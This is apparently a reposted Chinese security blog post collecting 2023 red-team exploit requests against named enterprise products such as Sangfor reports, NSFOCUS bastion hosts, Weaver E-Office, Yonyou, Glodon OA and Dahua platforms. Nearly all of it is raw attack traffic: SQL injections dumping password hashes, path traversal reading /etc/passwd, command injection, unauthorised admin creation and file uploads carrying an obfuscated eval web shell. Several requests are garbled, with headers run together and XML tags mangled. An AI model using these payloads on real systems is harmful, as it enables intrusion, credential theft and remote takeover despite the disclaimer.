#  【干货】HW2023POC收集   
红蓝攻防实验室  暗影安全   2023-08-20 12:58  
  
****> **免责声明**  
  
**技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为！！！**  
  
  
  
  
**HW2023POC部分收集：**  
  
**天玥前台注入：**  
  
```
POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
Host: ****
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Language: zh-CN,zh;q=0.9
Cookie: ****
Content-Type: application/x-www-form-urlencoded
Content-Length: 39


checkname=123&tagid=123
```  
  
###   
### 绿盟sas安全审计系统任意文件读取:  
  
```

/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd

```  
  
###   
### sx服:  
  
```
POST /rep/login
clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123

```  
  
###   
### 漏洞情报POC# sxf-报表 版本有限制:  
  
```
POST /rep/login HTTP/1.1 
Host: 
Cookie: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0 Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, image/webp,*/*;q=0.8 Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2 Accept-Encoding: gzip deflate Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: cross-site Pragma: no-cache Cache-Control: no-cache14 Te: trailers Connection: close Content-Type:application/x-www-form-urlencoded Content-Length: 126clsMode=cls_mode_login&index=index&log_type=report&page=login&rnd=0.7550103466497915&userID=admin%0Aid -a %0A&userPsw=tmbhuisq
```  
  
###   
### fanwei Weaver E-Office9 前台文件包含:  
  
```
http://URL/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls

```  
  
###   
### ruijie NBR 路由器 fileupload.php 任意文件上传漏洞:  
  
```
http://URL/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xlsPOST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
Host: 
Accept: text/plain, */*; q=0.01Content-Disposition: form-data; name="file"; filename="111.php"Content-Type: image/jpegPOST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1Host: Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name="file"; filename="111.php"
Content-Type: image/jpeg

```  
  
###   
### 网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞:  
  
```
POST /changepass.php?type=2 

Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"test","subAuthId":"1"}
old_pass=&password=Test123!@&repassword=Test123!@
```  
  
### 网神 SecGate 3600 防火墙 obj_app_upfile上传漏洞:  
  
访问路径：attachements/xxx.php  
  
```
POST /?g=obj_app_upfile HTTP/1.1
Host: x.x.x.x
Accept: */*Accept-Encoding: gzip, deflateContent-Length: 574Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQcUser-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)------WebKitFormBoundaryJpMyThWnAxbcBBQcContent-Disposition: form-data; name="MAX_FILE_SIZE"10000000------WebKitFormBoundaryJpMyThWnAxbcBBQcContent-Disposition: form-data; name="upfile"; filename="vulntest.php"Content-Type: text/plain------WebKitFormBoundaryJpMyThWnAxbcBBQcContent-Disposition: form-data; name="submit_post"obj_app_upfile------WebKitFormBoundaryJpMyThWnAxbcBBQcContent-Disposition: form-data; name="__hash__"0b9d6b1ab7479ab69d9f71b05e0e9445------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```  
  
  
**绿盟 SAS堡垒机 GetFile 任意文件读取漏洞:**  
  
通过漏洞包含 www/local_user.php 实现任意⽤户登录  
  
```
/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd


```  
  
  
****  
**绿盟 SAS堡垒机 Exec 远程命令执行漏洞:**  
  
```
/webconf/Exec/index?cmd=whoami

```  
  
  
****  
**绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞:**  
  
```
/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
```  
  
### yongyou 移动管理系统 uploadApk.do 任意文件上传漏洞:  
  
访问路径：/maupload/apk/a.jsp  
  
```
POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.serverConnection: close------WebKitFormBoundaryvLTG6zlX0gZ8LzO3Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"Content-Type: application/mswordhello------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
```  
  
### 广联达oa 漏洞:  
  
sql注入漏洞  
  
```

POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
Host: xxx.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspxAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 88dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
```  
  
  
文件上传漏洞  
  
```
POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1
Host: 10.10.10.1:8888
X-Requested-With: Ext.basex
Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Language: zh-Hans-CN,zh-Hans;q=0.5User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELjAccept: */*
Origin: http://10.10.10.1
Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512&menuitemid=120743&frame=1&modulecode=GTP.Workflow.TaskCenterModule&tabID=40
Cookie: 
Connection: close
Content-Length: 421

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
Content-Type: application/text

<%@ Page Language="Jscript" Debug=true%>
<%
var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD';
var GFMA=Request.Form("qmq1");
var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);
eval(GFMA, ONOQ);
%>

------WebKitFormBoundaryFfJZ4PlAZBixjELj--


```  
  
### ah 明御运维审计与风险控制系统 xmlrpc.sock 任意用户添加漏洞:  
  
```
POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
Host: 
Cookie: LANG=zh; DBAPPUSM=ee4bbf6c85e541bb980ad4e0fbee2f57bb15bafe20a7028af9a0b8901cf80fd3
Content-Length: 1117
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close  <methodCall><methodName>web.user_addmethodName><params><param><value><array><data><value><string>adminstring>value><value><string>5string>value><value><string>10.0.0.1string>value>data>array>value>param><param><value><struct><member><name>unamename><value><string>teststring>value>member><member><name>namename><value><string>teststring>value>member><member><name>pwdname><value><string>1qaz@3edC12345string>value>member><member><name>authmodename><value><string>1string>value>member><member><name>deptidname><value><string>string>value>member><member><name>emailname><value><string>string>value>member><member><name>mobilename><value><string>string>value>member><member><name>commentname><value><string>string>value>member><member><name>roleidname><value><string>102string>value>member>struct>value>param>params>methodCall>
```  
  
### 金和OA GetSgIData.aspx SQL注入漏洞:  
  
```
POST /c6/Contro/GetSglData.aspx/.ashx
Host: ip.port
User-Agent: Mozillal5.0 (Windows NT 5.1) AppleWebkit/537.36(KHTML， like Gecko) Chrome/35.0.2117.157 Safari/537 36
Connection: close
Content-Length.189
Content-Type. text/plain
Accept-Encoding: gzip
exec master..xp cmdshell 'ipconfig'
```  
  
### Coremail 邮件系统未授权访问获取管理员账密POC:  
  
```
/coremail/common/assets/;l;/;/;/;/;/s?biz=Mzl3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa72626e68&chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&scene=2
```  
  
### sxf报表 任意读取:  
  
```
GET /report/download.php?pdf=../../../../../etc/passwd HTTP/1.1
Host: xx.xx.xx.xx:85
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*Connection: Keep-Alive
```  
  
### 大华智慧园区综合管理平台 searchJson SQL注入漏洞:  
  
```
GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
Host: 127.0.0.1:7443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
```  
  
### 大华智慧园区综合管理平台 文件上传漏洞:  
  
```
POST /publishing/publishing/material/file/video HTTP/1.1
Host: 127.0.0.1:7443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 804
Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
Accept-Encoding: gzip, deflate
Connection: close
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Filedata"; filename="0EaE10E7dF5F10C2.jsp"
<%@page contentType="text/html; charset=GBK"%><%@page import="java.math.BigInteger"%><%@page import="java.security.MessageDigest"%><% MessageDigest md5 = null;md5 = MessageDigest.getInstance("MD5");String s = "123456";String miyao = "";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="poc"
poc
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Submit"
```  
  
  
**yongyou时空KSOA PayBill SQL注入漏洞:**  
  
```
POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 134
Accept-Encoding: gzip, deflate
Connection: close
<?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:03';-</name><name>1</name><name>102360</name></root>

```  
  
### HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞:  
  
```
/serverLog/showFile.php?fileName=../web/html/main.php

```  
  
### 泛微E-Office uploadify.php后台文件上传漏洞:  
  
```
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Connection: close
Content-Length: 259
Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
Accept-Encoding: gzip

--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="2TrZmO0y0SU34qUcUGHA8EXiDgN.php"
Content-Type: image/jpeg


<?php echo "2TrZmO0y0SU34qUcUGHA8EXiDgN";unlink(__FILE__);?>


--e64bdf16c554bbc109cecef6451c26a4--

```  
  
  
路径  
  
```
/attachment/3466744850/xxx.php
```  
  
  
  
**本文转载来源释然IT杂谈**  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PrTu58FA79bwwicW0Lg5LyzhwsucDdaP0hr0FHcjJAFUFsXjCHqia5BbgavliabU5SlZ6icq5jNN3VoDoGgRQTJFRw/640?wx_fmt=jpeg "")  
  
  
